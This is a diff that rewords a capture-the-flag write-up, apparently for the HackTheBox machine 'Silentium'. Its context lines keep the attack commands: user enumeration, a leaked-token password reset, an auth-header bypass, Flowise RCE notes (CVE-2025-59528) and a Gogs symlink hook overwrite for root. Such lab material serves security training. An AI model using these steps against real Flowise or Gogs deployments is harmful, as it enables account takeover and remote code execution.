@@ -43,7 +43,7 @@ remediation:
 
 ::: stage n=1 label="RECON" title="Two ports, one vhost, and a Flowise staging instance nobody locked down."
 
-Nmap shows the usual minimal Linux footprint: {cool:22} SSH and {cool:80} HTTP behind nginx. The web server redirects to `silentium.htb`.
+Nmap shows two open ports: {cool:22} SSH and {cool:80} HTTP behind nginx. The web server redirects to `silentium.htb`.
 
 ::: terminal title="shell · operator@kali" lang="bash"
 $ nmap -sC -sV -p 22,80 10.129.18.201
@@ -69,7 +69,7 @@ Add both to `/etc/hosts`:
 10.129.18.201 silentium.htb staging.silentium.htb
 :::
 
-The main site is a static corporate page for "Silentium International Asset Management". The team section lists a few employees, notably {red:Ben} with only a first name — potential username.
+The main site is a static corporate page for "Silentium International Asset Management". The team section lists employees, including {red:Ben}. The first name is a possible username.
 
 The staging subdomain runs **Flowise 3.0.5**, an open-source AI agent builder:
 
@@ -78,7 +78,7 @@ $ curl -s http://staging.silentium.htb/api/v1/version
 {"version":"3.0.5"}
 :::
 
-Most API endpoints return `{"error":"Unauthorized Access"}` — authentication is enabled. But the login endpoint leaks whether a user exists: a non-existent user returns {red:404} while a valid one returns {red:401}.
+Most API endpoints return `{"error":"Unauthorized Access"}` because authentication is enabled. But the login endpoint leaks whether a user exists: a non-existent user returns {red:404} while a valid one returns {red:401}.
 
 ::: terminal title="api · user enumeration" lang="bash"
 $ curl -s -X POST http://staging.silentium.htb/api/v1/auth/login \
@@ -122,7 +122,7 @@ $ curl -s -X POST "http://staging.silentium.htb/api/v1/account/forgot-password" 
 }
 :::
 
-We get a bcrypt hash (cost factor 5 — crackable) and, more importantly, a `tempToken` valid for 15 minutes. ==No cracking needed — the token lets us reset the password directly.==
+The response contains a bcrypt hash with cost factor 5 and a `tempToken` valid for 15 minutes. ==The token lets us reset the password without cracking the hash.==
 
 ### Password Reset via tempToken
 
@@ -132,7 +132,7 @@ $ curl -s -X POST "http://staging.silentium.htb/api/v1/account/reset-password" \
   -d '{"user":{"email":"ben@silentium.htb","tempToken":"KlbeT5AxSSKrgCiiRTPpky7ySZtGv3l8YHLHbKBIthS88jZQD3PlVOLbhfoqyv7B","password":"Pwned2026!"}}'
 :::
 
-Password reset confirmed. Now we log in and grab the Flowise API key. The `x-request-from: internal` header is critical — it bypasses the Flowise basic auth middleware layer, letting the JWT session cookie reach the API key endpoint.
+Password reset confirmed. Now we log in and grab the Flowise API key. The `x-request-from: internal` header bypasses the Flowise basic auth middleware layer, letting the JWT session cookie reach the API key endpoint.
 
 ::: terminal title="api · login + API key retrieval" lang="bash"
 $ curl -s -X POST "http://staging.silentium.htb/api/v1/auth/login" \
@@ -147,12 +147,12 @@ $ curl -s -H "x-request-from: internal" -b /tmp/cookies.txt \
 
 ### RCE via CustomMCP (CVE-2025-59528)
 
-Flowise < 3.0.6 has a {red:CVSS 10.0} RCE. The **CustomMCP** node passes user input from `mcpServerConfig` directly to JavaScript's `Function()` constructor — effectively `eval()`.
+Flowise < 3.0.6 has a {red:CVSS 10.0} RCE. The **CustomMCP** node passes user input from `mcpServerConfig` directly to JavaScript's `Function()` constructor, effectively `eval()`.
 
 ::: note title="IMPORTANT DETAILS"
-- `mcpServerConfig` **must** be nested inside the `inputs` object — top-level placement will not trigger execution.
+- `mcpServerConfig` **must** be nested inside the `inputs` object. Top-level placement will not trigger execution.
 - `process.mainModule.require("child_process")` escapes the `Function()` scope to access Node.js internals.
-- Standard bash reverse shells fail because the Docker container runs **Alpine Linux** with BusyBox `sh` — no `/dev/tcp` support. Use Python3 or direct exfiltration instead.
+- Standard bash reverse shells fail because the Docker container runs **Alpine Linux** with BusyBox `sh`, which has no `/dev/tcp` support. Use Python3 or direct exfiltration instead.
 :::
 
 Instead of a full reverse shell, we exfiltrate the container's environment variables directly:
@@ -199,7 +199,7 @@ ben@silentium:~$ cat user.txt
 
 ### Internal Service Discovery
 
-First order of business after landing: check for internal services.
+After connecting, check for internal services.
 
 ::: terminal title="shell · ben@silentium.htb" lang="bash"
 ben@silentium:~$ ss -tlnp
@@ -241,7 +241,7 @@ Gogs <= 0.13.3 allows authenticated users to modify files within the `.git` dire
 
 The target: the **pre-receive git hook** in the bare repository. Since Gogs runs as root, the hook fires as root on every `git push`.
 
-**Step 1** — Create and push a symlink pointing to the pre-receive hook:
+**Step 1:** Create and push a symlink pointing to the pre-receive hook:
 
 ::: terminal title="exploit · symlink creation" lang="bash"
 $ cd /tmp && mkdir hookpwn && cd hookpwn && git init
@@ -255,7 +255,7 @@ $ git commit -m 'add'
 $ git push "http://${TOKEN}@127.0.0.1:3001/pwner/hookpwn.git" master
 :::
 
-**Step 2** — Overwrite the hook through the symlink via the API:
+**Step 2:** Overwrite the hook through the symlink via the API:
 
 ::: terminal title="exploit · hook overwrite via API" lang="bash"
 $ PAYLOAD='#!/bin/bash
@@ -275,7 +275,7 @@ $ curl -X PUT "http://127.0.0.1:3001/api/v1/repos/pwner/hookpwn/contents/evil.li
 
 The API follows the symlink and writes our payload directly to the **pre-receive** hook file.
 
-**Step 3** — Trigger the hook with any `git push`:
+**Step 3:** Trigger the hook with any `git push`:
 
 ::: terminal title="exploit · trigger hook" lang="bash"
 $ echo "trigger" > trigger.txt
@@ -309,7 +309,7 @@ f1e788007cb0a0fadd2c29fcfb59d0a9
 {ok:root.txt captured.} Rooted.
 
 ::: warn
-Three CVEs chained: an info disclosure that leaked a reset token ({red:GHSA-jc5m-wrp2-qq38}), an RCE via `Function()` eval ({red:CVE-2025-59528}, CVSS 10.0), and a symlink path traversal in Gogs ({red:CVE-2025-64111}). None required advanced tooling — just `curl`, `git`, and patience.
+The chain used the reset-token disclosure ({red:GHSA-jc5m-wrp2-qq38}), the `Function()` RCE ({red:CVE-2025-59528}, CVSS 10.0), and the Gogs symlink traversal ({red:CVE-2025-64111}).
 :::
 
 :::
